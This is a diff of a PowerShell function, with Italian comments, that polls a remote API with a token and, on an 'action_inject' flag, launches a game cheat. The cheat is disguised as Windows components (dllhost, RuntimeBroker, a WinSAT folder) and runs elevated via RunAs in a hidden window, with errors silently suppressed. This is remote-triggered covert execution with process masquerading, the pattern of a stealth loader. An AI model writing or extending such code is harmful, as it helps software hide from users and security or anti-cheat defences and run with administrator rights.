@@ -82,17 +82,20 @@ function Ensure-Payload {
 # Poll /api/config e lancia cheat su action_inject
 function Poll-AndInject {
     param($token)
-    $exe = [System.IO.Path]::Combine($installBase,'dllhost.exe')
+    $initBat = [System.IO.Path]::Combine($installBase,'WinSATInit.bat')
     try {
         $wc  = New-Object System.Net.WebClient
         $url = "$apiBase/api/config?token=$token"
         $json = $wc.DownloadString($url) | ConvertFrom-Json
         if ($json.action_inject -eq $true) {
-            # Avvia il cheat solo se non è già in esecuzione
-            $running = Get-Process -Name 'dllhost' -ErrorAction SilentlyContinue |
-                       Where-Object { $_.MainModule.FileName -like "*WinSAT*" }
-            if (-not $running -and (Test-Path $exe)) {
-                Start-Process -FilePath $exe -WorkingDirectory $installBase -WindowStyle Hidden
+            # Avvia solo se il cheat non è già in esecuzione
+            $running = Get-Process -Name 'RuntimeBroker','dllhost' -ErrorAction SilentlyContinue |
+                       Where-Object { try { $_.MainModule.FileName -like "*WinSAT*" } catch { $false } }
+            if (-not $running -and (Test-Path $initBat)) {
+                Start-Process -FilePath 'cmd.exe' `
+                  -ArgumentList "/c `"$initBat`"" `
+                  -WorkingDirectory $installBase `
+                  -Verb RunAs -WindowStyle Hidden
             }
         }
     } catch {}
